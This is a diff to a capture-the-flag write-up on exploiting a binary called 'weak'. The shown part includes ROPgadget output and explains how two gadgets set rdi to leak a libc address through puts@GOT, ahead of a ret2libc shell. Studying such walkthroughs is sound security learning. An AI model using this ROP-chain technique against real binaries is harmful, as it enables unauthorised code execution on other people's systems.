@@ -36,7 +36,7 @@ RelRO                         : No
 ```
 As we can see the binary has no protection at all. So potentially we can also inject a shellcode into the stack and jump on it, but instead of this i managed to do full ROP.
 What i want to do to solve this challenge was make a memory-leak, restart execution and then ret2libc address to gain a shell.
-So what i did now was start to find some gadgets.
+So what i did at this point was start to find some gadgets.
 ```
 $ ROPgadget --binary ./weak --depth 40
 ```
@@ -79,8 +79,17 @@ $ ROPgadget --binary ./weak --depth 40 |grep pop|grep ret
 0x0000000000400518 : sti ; add al, 0x20 ; add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
 0x000000000040050d : syscall ; and byte ptr [rax], al ; cmp rax, rbx ; jb 0x40050e ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
 ```
-Then i start to search for more complicated gadgets to chain in order to gain control over rdi register.
+Then i start to search for more complicated gadgets that chained together they will make me get control over rdi register.
 The first gadget that i picked was this one:
 ```
 0x0000000000400637 : mov ebx, dword ptr [rsp + 8] ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
 ```
+and this is the second one:
+```
+0x0000000000400620 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
+```
+with the first one we can basically get control over ebx, rbp, r12, r13, r14, r15 by writing double words into the stack at the correct offsett.
+Then we can use the second gadget that end with a call.
+Since for now i just want to leak some libc address i'm just interesting on controlling rdi register with some got address and the call puts@GOT.
+The second gadgets make a 'mov edi, r13d' then we need to place leak-addr@GOT into r13 with the first gadget.
+I also need to make a call on puts() with the second gadget, then i need to set rbx=0 and r12=puts@GOT, and i can do that with the first gadget.
